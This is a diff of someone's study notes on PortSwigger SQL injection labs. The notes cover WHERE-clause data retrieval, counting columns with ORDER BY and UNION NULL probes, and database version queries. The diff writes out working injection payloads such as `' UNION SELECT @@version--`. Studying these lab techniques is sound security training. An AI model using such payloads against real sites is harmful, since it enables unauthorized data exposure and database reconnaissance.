@@ -1,4 +1,5 @@
-PortSwigger Article: [SQL Injection](https://portswigger.net/web-security/sql-injection)
+[PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection),
+[SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 ## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data 
 - When user selects a category: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` /filter?category=Clothing%2c+shoes+and+accessories
@@ -22,3 +23,14 @@ PortSwigger Article: [SQL Injection](https://portswigger.net/web-security/sql-in
 - In this lab, attempted `'+ORDER+BY+2--'` through 4 and noticed 4 returned an error. Determined there were three columns.
   - Verified 3 columns by also using `'+UNION+SELECT+NULL,NULL,NULL--'` (# of nulls has to match # of columns)
  
+## SQL injection attack, querying the database type and version on Oracle
+- You can identify the database type and version by injecting provider-specific queries:
+  - Microsoft/MySQL: `SELECT @@version`
+  - Oracle: `SELECT * FROM v$version`
+  - PostgreSQL: `SELECT version()`
+- For example, UNION attack with following input: `' UNION SELECT @@version--`
+- **REMEMBER** - you need to determine the number of columns first before performing a UNION attack.
+  - Performed `' ORDER BY 2--'` - determined 2 columns, as 3 returned an error (category='+ORDER+BY+2--')
+
+![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/cc5bd783-036f-4acc-9d71-c7452b4a7d63)
+
